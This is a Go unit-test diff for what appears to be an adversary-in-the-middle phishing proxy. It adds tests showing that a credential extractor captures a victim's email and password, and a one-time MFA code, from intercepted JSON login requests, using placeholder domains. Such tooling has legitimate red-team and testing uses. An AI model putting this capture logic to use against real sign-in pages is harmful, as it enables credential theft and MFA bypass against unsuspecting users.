@@ -109,6 +109,80 @@ func TestCredentialExtractor_NoPhishlet_Skips(t *testing.T) {
 	}
 }
 
+func TestCredentialExtractor_JSONCredentials(t *testing.T) {
+	h := &request.CredentialExtractor{
+		Capturer: &stubCredentialCapturer{},
+		Logger:   discardLogger(),
+	}
+	ctx := &aitm.ProxyContext{
+		Session: &aitm.Session{ID: "sess-1"},
+		Phishlet: &aitm.Phishlet{
+			Login: aitm.LoginSpec{Domain: "login.example.com", Path: "/api/login"},
+			Credentials: aitm.CredentialRules{
+				Username: aitm.CredentialRule{
+					Key:    regexp.MustCompile(`email`),
+					Search: regexp.MustCompile(`"email"\s*:\s*"([^"]+)"`),
+					Type:   "json",
+				},
+				Password: aitm.CredentialRule{
+					Key:    regexp.MustCompile(`password`),
+					Search: regexp.MustCompile(`"password"\s*:\s*"([^"]+)"`),
+					Type:   "json",
+				},
+			},
+		},
+	}
+	body := strings.NewReader(`{"email":"victim@example.com","password":"s3cr3t"}`)
+	req := newReq(http.MethodPost, "https://login.example.com/api/login", body)
+	req.Host = "login.example.com"
+	req.Header.Set("Content-Type", "application/json")
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Session.Username != "victim@example.com" {
+		t.Errorf("Username = %q, want %q", ctx.Session.Username, "victim@example.com")
+	}
+	if ctx.Session.Password != "s3cr3t" {
+		t.Errorf("Password = %q, want %q", ctx.Session.Password, "s3cr3t")
+	}
+}
+
+func TestCredentialExtractor_JSONCustomField(t *testing.T) {
+	h := &request.CredentialExtractor{
+		Capturer: &stubCredentialCapturer{},
+		Logger:   discardLogger(),
+	}
+	ctx := &aitm.ProxyContext{
+		Session: &aitm.Session{ID: "sess-1"},
+		Phishlet: &aitm.Phishlet{
+			Login: aitm.LoginSpec{Domain: "login.example.com"},
+			Credentials: aitm.CredentialRules{
+				Custom: []aitm.CustomCredentialRule{
+					{
+						Name: "otp",
+						CredentialRule: aitm.CredentialRule{
+							Key:    regexp.MustCompile(`code`),
+							Search: regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`),
+							Type:   "json",
+						},
+					},
+				},
+			},
+		},
+	}
+	body := strings.NewReader(`{"code":"123456"}`)
+	req := newReq(http.MethodPost, "https://login.example.com/mfa", body)
+	req.Host = "login.example.com"
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Session.Custom == nil || ctx.Session.Custom["otp"] != "123456" {
+		t.Errorf("Custom[otp] = %q, want %q", ctx.Session.Custom["otp"], "123456")
+	}
+}
+
 func TestCredentialExtractor_NoRuleMatch_NoUpdate(t *testing.T) {
 	h := &request.CredentialExtractor{
 		Capturer: &stubCredentialCapturer{},
